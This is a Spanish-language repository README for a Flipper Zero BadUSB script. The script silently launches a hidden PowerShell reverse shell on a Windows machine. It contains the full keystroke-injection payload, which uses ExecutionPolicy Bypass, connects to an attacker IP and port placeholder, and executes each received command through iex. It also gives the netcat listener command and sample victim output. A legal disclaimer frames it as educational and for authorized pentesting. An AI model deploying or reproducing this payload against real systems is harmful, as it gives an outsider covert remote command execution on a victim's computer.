# Reverse Shell Payload for Flipper Zero

Este repositorio contiene una **payload** para Flipper Zero que inicia una **reverse shell** en PowerShell de forma oculta, ideal para pruebas en entornos controlados.

---

## ⚙️ Requisitos

* Flipper Zero con firmware compatible (v0.54+).
* Ordenador atacante con `nc` o `rlwrap nc` escuchando en el puerto elegido.
* Windows victim con PowerShell instalado (Windows 7/10/11).

---

## 📜 Payload

Guarda este script en `/badusb/` de tu Flipper Zero (por ejemplo, `reverse_shell.txt`):

```txt
DELAY 1000
GUI r
DELAY 500

REM — 1ª PowerShell visible para poder teclear —
STRING powershell
ENTER
DELAY 100

REM — Lanza un PowerShell oculto con tu bucle de reverse‑shell y cierra este —
STRING Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoP -NonI -ExecutionPolicy Bypass -Command "$a=''System.Net.Sockets.TCPClient'';$x=New-Object ($a) ''<TU_IP_ATACANTE>'',<PUERTO>; $s=$x.GetStream(); $sr=New-Object System.IO.StreamReader($s); $sw=New-Object System.IO.StreamWriter($s); $sw.AutoFlush=$true; while(($l=$sr.ReadLine()) -ne $null){ $o=iex $l 2>&1|Out-String; $sw.WriteLine($o) }"' ; exit
DELAY 100
ENTER
```

> **Importante**: Sustituye `<TU_IP_ATACANTE>` y `<PUERTO>` por tu dirección IP y puerto de escucha.

---

## 🚀 Uso

1. **Configura** tu listener en Linux/macOS/Windows:

   ```bash
   rlwrap nc -l -v -n <PUERTO>
   ```
2. **Carga** el payload en tu Flipper Zero y ejecútalo en el equipo víctima.
3. Tras unos segundos, tu **listener** mostrará:

   ```text
   Connection received on <IP_VICTIMA> <PUERTO>
   whoami
   <USUARIO>\\<EQUIPO>
   ```
4. A partir de ahí, puedes enviar comandos (por ejemplo `dir`, `ipconfig`, etc.) y recibir la salida.

---

## 📖 Estructura del repositorio

```text
/ reverse_shell.txt    ← Payload para Flipper Zero
/ README.md           ← Esta guía
```

---

## ⚠️ Disclaimer legal

Este proyecto es **únicamente** para **fines educativos** y de **pentesting autorizado**. No debes usar este payload contra sistemas en los que no tengas **permiso expreso** para realizar pruebas de seguridad.

El autor no se hace responsable del uso indebido que se realice de este material. Asegúrate siempre de actuar de acuerdo con las leyes y regulaciones locales.

---

## 📜 Licencia

Este proyecto se distribuye bajo la licencia MIT. Puedes modificarlo y redistribuirlo, siempre manteniendo este aviso y la atribución al autor original.

By amis13
